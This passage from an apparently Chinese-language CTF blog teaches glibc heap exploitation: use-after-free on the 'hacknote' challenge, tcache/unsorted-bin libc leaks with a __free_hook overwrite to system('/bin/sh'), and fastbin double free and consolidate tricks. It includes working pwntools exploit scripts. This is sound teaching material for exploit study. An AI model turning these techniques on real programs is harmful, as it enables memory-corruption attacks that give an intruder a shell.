class="string">b&#x27;Content:&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x88</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x190</span>)</span><br><span class="line">edit(<span class="number">8</span>,payload)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0xf0</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base--&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x88</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x88</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x88</span>)</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">edit(<span class="number">13</span>,p64(system))</span><br><span class="line">edit(<span class="number">12</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>for i in range (7):</p>
<p>​    add(i,0xf0)</p>
<p>add(7,0xf0)</p>
<p>先申请七个，在申请的这个就会进入unsortbins，用来泄露libc</p>
<p>add(8,0x88)</p>
<p>这个堆块是在Tcachebins  中，但是也可以堆块合并堆叠，并且利用比fastbins更简单</p>
<p>for i in range(7):</p>
<p>​    add(i, 0xf0)</p>
<p>add(7, 0xf0)</p>
<p>这个先将7个Tcachebin申请出来，在申请一个就是unsortbins的，这样就可以泄露libc了，后面就不解释了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/18/UAF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="和方煜">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="小小pwn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/11/18/UAF/" class="post-title-link" itemprop="url">UAF</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2025-11-18 00:24:27 / 修改时间：00:25:08" itemprop="dateCreated datePublished" datetime="2025-11-18T00:24:27+08:00">2025-11-18</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%A0%86/" itemprop="url" rel="index"><span itemprop="name">堆</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>4k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>4 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <hr>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理 :"></a>原理 :</h2><p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p>
<ul>
<li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li>
</ul>
<p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</strong></p>
<h1 id="例题-ida："><a href="#例题-ida：" class="headerlink" title="例题  ida："></a>例题  ida：</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">add_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">    <span class="type">int</span> size; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [esp+14h] [ebp-14h] BYREF</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">    v5 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( count &lt;= <span class="number">5</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !*(&amp;notelist + i) )</span><br><span class="line">            &#123;</span><br><span class="line">                *(&amp;notelist + i) = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">                <span class="keyword">if</span> ( !*(&amp;notelist + i) )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                *(_DWORD *)*(&amp;notelist + i) = print_note_content;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Note size :&quot;</span>);</span><br><span class="line">                read(<span class="number">0</span>, buf, <span class="number">8u</span>);</span><br><span class="line">                size = atoi(buf);</span><br><span class="line">                v0 = (<span class="type">int</span>)*(&amp;notelist + i);</span><br><span class="line">                *(_DWORD *)(v0 + <span class="number">4</span>) = <span class="built_in">malloc</span>(size);</span><br><span class="line">                <span class="keyword">if</span> ( !*((_DWORD *)*(&amp;notelist + i) + <span class="number">1</span>) )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">                read(<span class="number">0</span>, *((<span class="type">void</span> **)*(&amp;notelist + i) + <span class="number">1</span>), size);</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Success !&quot;</span>);</span><br><span class="line">                ++count;</span><br><span class="line">                <span class="keyword">return</span> __readgsdword(<span class="number">0x14u</span>) ^ v5;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> __readgsdword(<span class="number">0x14u</span>) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解释：</p>
<p>1.申请两个堆块第一个堆块大小0x8（加上堆的头部0x10）并将堆指针所在的地址的内容写为（<code>print_note_content</code>）</p>
<p>2.申请第二个堆块大小自己定作为用户数据段（但是也有堆头也就是0x28），并将堆指针所在地址后面四个字节写入第二个堆块的指针所指的地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">del_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;notelist + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="type">void</span> **)*(&amp;notelist + v1) + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(*(&amp;notelist + v1));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14u</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>清空两个堆块，但没有将指针置零，指针变为悬挂指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">print_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;notelist + v1) )</span><br><span class="line">    (*(<span class="type">void</span> (__cdecl **)(_DWORD))*(&amp;notelist + v1))(*(&amp;notelist + v1));</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14u</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>引用后得到的函数指针所指向的函数(也就是print_note_content)，同时将 <code>*(&amp;notelist + v1)</code> 作为参数传递给该函数（也就是将堆块的内容打印出来）</p>
<h1 id="UAF漏洞"><a href="#UAF漏洞" class="headerlink" title="UAF漏洞"></a>UAF漏洞</h1><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>堆 UAF 漏洞指的是程序在释放堆内存之后，没有将对应的指针置为 <code>NULL</code>，并且后续代码又对该已经释放的内存进行了访问操作。这种情况下，被释放的内存可能会被重新分配给其他对象使用，此时对原指针的访问就会导致数据混乱、程序崩溃，甚至可能被攻击者利用来执行任意代码</p>
<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p>
<ul>
<li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong></li>
</ul>
<h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><ul>
<li>申请 note0，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）</li>
<li>申请 note1，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）</li>
<li>释放 note0</li>
<li>释放 note1</li>
<li>此时，大小为 16 的 fast bin chunk 中链表为 note1-&gt;note0</li>
<li>申请 note2，并且设置 real content 的大小为 8，那么根据堆的分配规则</li>
<li>note2 其实会分配 note1 对应的内存块。</li>
<li>real content 对应的 chunk 其实是 note0。</li>
<li>如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用 magic 函数</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addnote</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">&quot;ddaa&quot;</span>)</span><br><span class="line">gdb.attach(r)</span><br><span class="line">delnote(<span class="number">0</span>)</span><br><span class="line">delnote(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic))</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">printnote(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>申请四个堆块（也就是两个0，1），将两个堆块free，在申请一个（2），这时候之前申请的两个0x10的堆块就会被重新启用，先free的A的指针内的内容就会被改为后门地址，print_note（0），本来会调用print_note_content，但是内容被改为了后门地址就会调用后门的函数获得shell</p>
<p>为什么不是print_note（1），因为申请一次堆块其实是申请出来了两个堆块，第二个堆块内才被写入数据，所以不是print_note（1）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/18/fastbin-attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="和方煜">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="小小pwn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/11/18/fastbin-attack/" class="post-title-link" itemprop="url">fastbin attack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2025-11-18 00:00:59 / 修改时间：00:22:39" itemprop="dateCreated datePublished" datetime="2025-11-18T00:00:59+08:00">2025-11-18</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%A0%86/" itemprop="url" rel="index"><span itemprop="name">堆</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2.9k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>3 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <hr>
<h1 id="1-Fastbin-Double-Free"><a href="#1-Fastbin-Double-Free" class="headerlink" title="1.Fastbin Double Free"></a>1.Fastbin Double Free</h1><p>Double free及将一个堆块free两次，gdb中如下图所示</p>
<p><img src="/2025/11/18/fastbin-attack/70284676bc5d1e887cca2f653cfcea8a.png" alt="70284676bc5d1e887cca2f653cfcea8a"></p>
<p>这样我们就可以将两个堆块申请在同一个位置，其中一个堆块是free状态，我们可以通过另一个堆块对fd指针进行修改</p>
<p><strong>Fastbin Double Free能够成功利用的原因：</strong></p>
<p>1.fastbin的堆块被释放后next_chunk的prev_inuse位不会被清空</p>
<p>2.fastbin在执行free的时候仅验证了main_arena直接指向的块，即链表指针头部的块。对于链表后面的块并没有进行验证</p>
<h1 id="2-fastbin-dump-into-stack"><a href="#2-fastbin-dump-into-stack" class="headerlink" title="2.fastbin dump into stack"></a>2.fastbin dump into stack</h1><p>顾名思义，将堆块申请在栈上，控制栈上的数据，利用uaf漏洞，将fd指针改为要控制数据的地址-0x10（因为fd指针指的是堆块的头部，所以需要-0x10，才刚好使数据段落在要要控制数据的栈上），修改堆块的内容就可以控制栈上的数据</p>
<p>注：首先要伪造size位（0xn1）</p>
<p>ISMMAP位不能为1</p>
<p>inues位为0</p>
<p>size位为0x40</p>
<p>地址要64位：0&#x2F;8</p>
<p>​          32位：0&#x2F;4  对齐</p>
<p>在内存中构造了一个了一个堆块，还要怎么样才能让它   free</p>
<p>扩展用在fastbin attack打mallco使申请堆块大小受限制（&lt;&#x3D;0x60,也就是没发使堆块的size位为0x71）</p>
<p>在2.23和2.27的libc版本中，由于没有对top chunk的size合法性进行检查，所以我们把top_chunk的地址改了，就能申请任意地址</p>
<p>直接改top chunk的地址</p>
<p>申请一个size位为0x31的堆块，free掉，修改fd指针为0x61，再将这个堆块申请出来，这样main_arena中存储大小为0x30的堆块的数组就会存上0x61（为了伪造size位）</p>
<p><img src="/2025/11/18/fastbin-attack/image.png" alt="image"></p>
<p>然后我们申请一个size位为0x61的堆块，free掉，修改指针到main_arena-80的地方这样，申请两次，将main_arena-80的堆块申请出来，因为main_arena-80与top chunk的地址紧挨着，所以可以写数据覆盖top chunk</p>
<p>为什么要是main_arena-80看图</p>
<p><img src="/2025/11/18/fastbin-attack/image-1763396154028-3.png" alt="image"></p>
<p>这样可以伪造一个size位，堆块才能被申请在这里</p>
<p><img src="/2025/11/18/fastbin-attack/imag.png" alt="imag"></p>
<p>具体写多少自己数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x61</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x50</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0x7ffff7bc4b28</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x50</span>)</span><br><span class="line">bug()</span><br><span class="line">payload = p64(<span class="number">8</span>)*<span class="number">8</span>+p64(<span class="number">0x7ffff7bc4aed</span>)</span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br></pre></td></tr></table></figure>

<h2 id="3-fastbin-dup-consolidate"><a href="#3-fastbin-dup-consolidate" class="headerlink" title="3.fastbin dup consolidate"></a>3.fastbin dup consolidate</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdint.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main() &#123;</span><br><span class="line">  void* p1 = malloc(<span class="number">0x40</span>);</span><br><span class="line">  void* p2 = malloc(<span class="number">0x40</span>);</span><br><span class="line">  fprintf(stderr, <span class="string">&quot;Allocated two fastbins: p1=%p p2=%p\n&quot;</span>, p1, p2);</span><br><span class="line">  fprintf(stderr, <span class="string">&quot;Now free p1!\n&quot;</span>);</span><br><span class="line">  free(p1);</span><br><span class="line"></span><br><span class="line">  void* p3 = malloc(<span class="number">0x400</span>);</span><br><span class="line">  fprintf(stderr, <span class="string">&quot;Allocated large bin to trigger malloc_consolidate(): p3=%p\n&quot;</span>, p3);</span><br><span class="line">  fprintf(stderr, <span class="string">&quot;In malloc_consolidate(), p1 is moved to the unsorted bin.\n&quot;</span>);</span><br><span class="line">  free(p1);</span><br><span class="line">  fprintf(stderr, <span class="string">&quot;Trigger the double free vulnerability!\n&quot;</span>);</span><br><span class="line">  fprintf(stderr, <span class="string">&quot;We can pass the check in malloc() since p1 is not fast top.\n&quot;</span>);</span><br><span class="line">  fprintf(stderr, <span class="string">&quot;Now p1 is in unsorted bin and fast bin. So we&#x27;will get it twice: %p %p\n&quot;</span>, malloc(<span class="number">0x40</span>), malloc(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>申请两个堆块大小范围在fastbin，p2是为了防止触发<code>malloc_consolidate</code> 使得p1被合并进入top_chunk</p>
<p>free掉p1进入fastbin申请0x400的大小的chunk，这时触发<code>malloc_consolidate</code>，p1就会被放在unsortbin</p>
<p>因为这时候p1已经不在fastbins了，可以再次free一次触发double free</p>
<p>这时候申请两次</p>
<p>第一次会把 fastbin 中的 p1 chunk 给 malloc 出来，然后 fastbin 为空</p>
<p>第二次会把 unsorted 中的 p1 chunk 给 malloc 出来，所以会能 malloc 到两次一样的 chunk</p>
<p>效果: 首先它会像unsortedbin（small）一样将相邻高地址的堆块inuse位置零同时也会被放进unsortedbin链表中(即存在fd和bk的使用), 其次它依旧满足fastbin的free堆块inuse位不置零, 那么如果存在有off by one或者其写入大小符合在不free时可以写入下一个chunk的pre_size, 那么就很容易触发到unlink了</p>
<p>具体实现：</p>
<p>malloc_consolidate的功能就是把chunk从fastbin取出，相邻的chunk进行合并，并且会设置下一个chunk的prev_inuse位为0。当chunk从fastbin里取出后，我们就可以在再一次free这个chunk了，此时，fastbin里没有形成循环链表，一个chunk在fastbin，一个chunk在unosrted bin（small）。关键的一点是下一个chunk的prev_inuse已经清零，我们将fastbin里的那个chunk申请回来，伪造一个chunk（往fastbin中写，也就是写入了unsortbin中，将fd与bk设为对应的值就可以），然后释放下一个unsorted bin范围的chunk，就会发生unlink。</p>
